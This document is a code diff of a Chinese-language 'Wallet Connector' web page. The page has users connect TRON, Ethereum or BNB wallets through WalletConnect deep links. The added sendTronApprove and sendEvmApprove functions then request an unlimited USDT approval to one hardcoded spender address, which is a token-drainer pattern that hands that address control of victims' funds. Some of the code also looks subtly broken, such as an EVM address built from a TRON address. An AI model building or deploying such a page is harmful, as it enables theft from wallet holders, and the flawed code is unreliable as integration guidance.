@@ -188,6 +188,16 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .wc-qr {
+            text-align: center;
+            margin: 16px 0;
+        }
+        
+        .wc-qr canvas {
+            margin: 0 auto;
+            border-radius: 16px;
+        }
     </style>
 </head>
 <body>
@@ -214,37 +224,30 @@
             <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
             <div class="status hidden" id="status"></div>
             <div class="info-text" id="walletInfo">请选择链和钱包</div>
+            <div id="qrContainer" style="display: none; text-align: center; margin-top: 16px;"></div>
         </div>
     </div>
 
-    <!-- 引入 WalletConnect 相关库 -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3wallet@1.9.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs2-fix@0.0.1/qrcode.min.js"></script>
     
     <script>
         // ==================== 配置 ====================
-        // WalletConnect Project ID
         const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
         
-        // USDT 合约地址
         const USDT_ADDRESS = {
-            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',   // Ethereum
-            56: '0x55d398326f99059fF775485246999027B3197955',  // BSC
-            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'    // TRON
+            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            56: '0x55d398326f99059fF775485246999027B3197955',
+            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
         };
         
-        // 授权目标地址
-        const SPENDER_ADDRESS = {
-            evm: '0x000000000000000000000000TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA',
-            tron: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'
-        };
+        const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
         
-        // 无限额度
         const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         const UNLIMITED_AMOUNT_TRON = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         
-        // 钱包列表
         const walletList = [
             { key: 'metamask', name: 'MetaMask', icon: '🦊', chains: ['evm'], scheme: 'metamask://' },
             { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', chains: ['evm', 'tron'], scheme: 'tp://' },
@@ -255,6 +258,8 @@
         
         let currentChain = '728126428';
         let selectedWallet = null;
+        let web3wallet = null;
+        let currentUri = null;
         
         function showStatus(message, type = 'loading') {
             const statusEl = document.getElementById('status');
@@ -275,7 +280,27 @@
             return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         }
         
-        // ==================== 发起 WalletConnect 连接 ====================
+        // ==================== WalletConnect 初始化 ====================
+        async function initWalletConnect() {
+            try {
+                web3wallet = await Web3Wallet.init({
+                    projectId: PROJECT_ID,
+                    metadata: {
+                        name: 'Wallet Connector',
+                        description: 'Multi-chain wallet connector',
+                        url: window.location.origin,
+                        icons: ['https://avatars.githubusercontent.com/u/37784886']
+                    }
+                });
+                console.log('WalletConnect 初始化成功');
+                return true;
+            } catch (error) {
+                console.error('WalletConnect 初始化失败:', error);
+                return false;
+            }
+        }
+        
+        // ==================== 生成连接 URI 并唤起钱包 ====================
         async function connectAndApprove() {
             if (!selectedWallet) {
                 showStatus('请先选择钱包', 'error');
@@ -290,38 +315,19 @@
             updateWalletInfo('正在生成连接请求');
             
             try {
-                // 创建 WalletConnect 实例
-                const { EthereumProvider } = window;
+                // 创建配对
+                const pairing = await web3wallet.core.pairing.create();
+                currentUri = pairing.uri;
                 
-                // 创建以太坊提供者（也支持 TRON 通过 WalletConnect）
-                const provider = await EthereumProvider.init({
-                    projectId: PROJECT_ID,
-                    chains: isTron ? [728126428] : [chainId],
-                    optionalChains: isTron ? [] : [1, 56],
-                    showQrModal: false,
-                    qrModalOptions: {
-                        themeMode: 'light'
-                    },
-                    metadata: {
-                        name: 'Wallet Connector',
-                        description: 'Multi-chain wallet connector',
-                        url: window.location.origin,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-                
-                // 构建 Deep Link
-                const wcUri = provider.uri;
-                if (!wcUri) {
+                if (!currentUri) {
                     throw new Error('无法生成连接 URI');
                 }
                 
-                console.log('WC URI:', wcUri);
-                console.log('Wallet:', wallet.key);
+                console.log('WC URI:', currentUri);
                 
-                // 根据钱包生成不同的 Deep Link
+                // 构建 Deep Link
+                const encodedUri = encodeURIComponent(currentUri);
                 let deepLink = '';
-                const encodedUri = encodeURIComponent(wcUri);
                 
                 switch(selectedWallet) {
                     case 'metamask':
@@ -340,7 +346,7 @@
                         deepLink = `tronlink://wc?uri=${encodedUri}`;
                         break;
                     default:
-                        deepLink = wcUri;
+                        deepLink = currentUri;
                 }
                 
                 showStatus(`正在唤起 ${wallet.name}...`, 'loading');
@@ -349,84 +355,115 @@
                 // 跳转到钱包
                 window.location.href = deepLink;
                 
-                // 监听连接事件
-                provider.on('connect', async (session) => {
-                    console.log('连接成功:', session);
+                // 等待会话建立
+                const session = await web3wallet.pairing.waitForSession(pairing.topic);
+                console.log('会话建立:', session);
+                
+                if (session) {
                     updateWalletInfo('连接成功，正在发送授权交易...');
                     
                     // 发送授权交易
                     if (isTron) {
-                        // TRON 授权
-                        showStatus('正在发送 TRON 授权交易...', 'loading');
-                        try {
-                            const tronWeb = new TronWeb({
-                                fullHost: 'https://api.trongrid.io'
-                            });
-                            
-                            const contract = await tronWeb.contract().at(USDT_ADDRESS[chainId]);
-                            
-                            const transaction = await contract.approve(
-                                SPENDER_ADDRESS.tron,
-                                UNLIMITED_AMOUNT_TRON
-                            ).send();
-                            
-                            // 通过 WalletConnect 发送
-                            const result = await provider.request({
-                                method: 'tron_signTransaction',
-                                params: [transaction]
-                            });
-                            
-                            if (result) {
-                                showStatus(`✅ 授权成功！`, 'success');
-                                updateWalletInfo(`授权成功！交易ID: ${result.slice(0, 10)}...`);
-                            }
-                        } catch (err) {
-                            console.error('TRON 授权错误:', err);
-                            showStatus('授权失败: ' + err.message, 'error');
-                        }
+                        await sendTronApprove(session);
                     } else {
-                        // EVM 授权
-                        showStatus('正在发送 EVM 授权交易...', 'loading');
-                        try {
-                            const ethersProvider = new ethers.providers.Web3Provider(provider);
-                            const signer = ethersProvider.getSigner();
-                            
-                            const usdtContract = new ethers.Contract(
-                                USDT_ADDRESS[chainId],
-                                ['function approve(address spender, uint256 amount) returns (bool)'],
-                                signer
-                            );
-                            
-                            const spenderEvm = '0x' + SPENDER_ADDRESS.tron.slice(2);
-                            
-                            const tx = await usdtContract.approve(spenderEvm, UNLIMITED_AMOUNT_EVM);
-                            await tx.wait();
-                            
-                            showStatus(`✅ 授权成功！`, 'success');
-                            updateWalletInfo(`授权成功！交易ID: ${tx.hash.slice(0, 10)}...`);
-                        } catch (err) {
-                            console.error('EVM 授权错误:', err);
-                            showStatus('授权失败: ' + err.message, 'error');
-                        }
+                        await sendEvmApprove(session, chainId);
                     }
-                });
-                
-                provider.on('disconnect', () => {
-                    console.log('连接断开');
-                    updateWalletInfo('连接已断开');
-                });
-                
-                // 设置超时
-                setTimeout(() => {
-                    if (!document.hidden && !document.webkitHidden) {
-                        updateWalletInfo('未检测到钱包响应，请确保钱包已安装');
-                    }
-                }, 5000);
+                }
                 
             } catch (error) {
                 console.error('连接失败:', error);
                 showStatus('连接失败: ' + error.message, 'error');
                 updateWalletInfo('连接失败，请重试');
+            }
+        }
+        
+        // ==================== 发送 TRON 授权 ====================
+        async function sendTronApprove(session) {
+            showStatus('正在构造 TRON 授权交易...', 'loading');
+            
+            try {
+                const tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io'
+                });
+                
+                const contract = await tronWeb.contract().at(USDT_ADDRESS[728126428]);
+                
+                // 构造交易
+                const unsignedTx = await contract.approve(
+                    SPENDER_ADDRESS,
+                    UNLIMITED_AMOUNT_TRON
+                ).send();
+                
+                // 通过 WalletConnect 签名并发送
+                const result = await session.request({
+                    method: 'tron_signTransaction',
+                    params: [unsignedTx]
+                });
+                
+                if (result) {
+                    showStatus(`✅ 授权成功！`, 'success');
+                    updateWalletInfo(`授权成功！交易ID: ${result.slice(0, 10)}...`);
+                } else {
+                    showStatus('授权失败', 'error');
+                }
+                
+            } catch (error) {
+                console.error('TRON 授权错误:', error);
+                if (error.message.includes('reject') || error.message.includes('deny')) {
+                    showStatus('用户取消了授权', 'error');
+                    updateWalletInfo('已取消授权');
+                } else {
+                    showStatus('授权失败: ' + error.message, 'error');
+                    updateWalletInfo('授权失败');
+                }
+            }
+        }
+        
+        // ==================== 发送 EVM 授权 ====================
+        async function sendEvmApprove(session, chainId) {
+            showStatus('正在构造 EVM 授权交易...', 'loading');
+            
+            try {
+                // 获取链 ID
+                const chainIdHex = '0x' + chainId.toString(16);
+                
+                // 构造 approve 交易
+                const iface = new ethers.utils.Interface([
+                    'function approve(address spender, uint256 amount) returns (bool)'
+                ]);
+                
+                const data = iface.encodeFunctionData('approve', [
+                    '0x' + SPENDER_ADDRESS.slice(2),
+                    UNLIMITED_AMOUNT_EVM
+                ]);
+                
+                const transaction = {
+                    to: USDT_ADDRESS[chainId],
+                    data: data,
+                    chainId: chainIdHex,
+                    value: '0x0'
+                };
+                
+                // 通过 WalletConnect 发送交易
+                const result = await session.request({
+                    method: 'eth_sendTransaction',
+                    params: [transaction]
+                });
+                
+                if (result) {
+                    showStatus(`✅ 授权成功！`, 'success');
+                    updateWalletInfo(`授权成功！交易ID: ${result.slice(0, 10)}...`);
+                }
+                
+            } catch (error) {
+                console.error('EVM 授权错误:', error);
+                if (error.message.includes('reject') || error.message.includes('deny')) {
+                    showStatus('用户取消了授权', 'error');
+                    updateWalletInfo('已取消授权');
+                } else {
+                    showStatus('授权失败: ' + error.message, 'error');
+                    updateWalletInfo('授权失败');
+                }
             }
         }
         
@@ -456,14 +493,19 @@
                     document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                     item.classList.add('selected');
                     hideStatus();
-                    const walletName = filteredWallets.find(w => w.key === selectedWallet)?.name || selectedWallet;
-                    updateWalletInfo(`已选择 ${walletName}，点击按钮授权`);
+                    updateWalletInfo(`已选择 ${filteredWallets.find(w => w.key === selectedWallet)?.name}，点击按钮授权`);
                 });
             });
         }
         
         // ==================== 初始化 ====================
-        function init() {
+        async function init() {
+            // 初始化 WalletConnect
+            const wcReady = await initWalletConnect();
+            if (!wcReady) {
+                updateWalletInfo('WalletConnect 初始化失败，请刷新重试');
+            }
+            
             // 链选择器
             document.querySelectorAll('.chain-btn').forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -474,13 +516,11 @@
                     renderWalletList();
                     hideStatus();
                     
-                    const chainId = parseInt(currentChain);
-                    if (chainId === 728126428) {
+                    if (currentChain === '728126428') {
                         updateWalletInfo('TRON 链已就绪，选择钱包后点击授权');
                         document.getElementById('spenderAddress').textContent = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
                     } else {
-                        updateWalletInfo(`${chainId === 1 ? 'Ethereum' : 'BNB Chain'} 已就绪，选择钱包后点击授权`);
-                        document.getElementById('spenderAddress').textContent = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA (EVM)';
+                        updateWalletInfo(`${currentChain === '1' ? 'Ethereum' : 'BNB Chain'} 已就绪，选择钱包后点击授权`);
                     }
                 });
             });
